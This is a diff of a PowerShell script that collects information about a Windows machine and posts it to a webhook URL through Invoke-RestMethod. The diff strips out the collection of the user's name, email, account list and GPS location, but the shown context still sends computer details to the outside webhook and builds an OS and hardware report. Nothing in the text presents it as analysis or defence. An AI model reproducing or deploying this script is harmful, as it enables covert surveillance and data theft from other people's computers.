@@ -20,15 +20,6 @@ $hookurl = "$dc"
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
-# User Information
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = (Get-ComputerInfo).WindowsRegisteredOwner
-
-# Other Users
-$users = "$($userInfo.Name)"
-$userString = "`nFull Name : $($userInfo.FullName)"
-
 # System Language
 $systemLocale = Get-WinSystemLocale
 $systemLanguage = $systemLocale.Name
@@ -67,20 +58,6 @@ while ($true){
     if (($value+4) -ge $totalSize){
         break
     }
-}
-
-# GPS Location Info
-Add-Type -AssemblyName System.Device
-$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
-$GeoWatcher.Start()
-while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
-if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
-else{
-	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
-	$GL = $GL -split " "
-	$Lat = $GL[0].Substring(11) -replace ".$"
-	$Lon = $GL[1].Substring(10) -replace ".$"
-    $GPS = "LAT = $Lat LONG = $Lon"
 }
 
 # Hardware Information
@@ -399,12 +376,6 @@ $infomessage1 = "
 =======================================
 SYSTEM INFORMATION FOR $env:COMPUTERNAME
 =======================================
-User Information
----------------------------------------
-Current User      : $env:USERNAME
-Full Name         : $fullName
-Email Address     : $email
-Other Users       : $users
 
 OS Information
 ---------------------------------------
@@ -415,7 +386,6 @@ Build ID          : $WinVersion
 Architechture     : $OSArch
 Screen Size       : $screensize
 Activation Date   : $activated
-Location          : $GPS
 
 Hardware Information
 ---------------------------------------
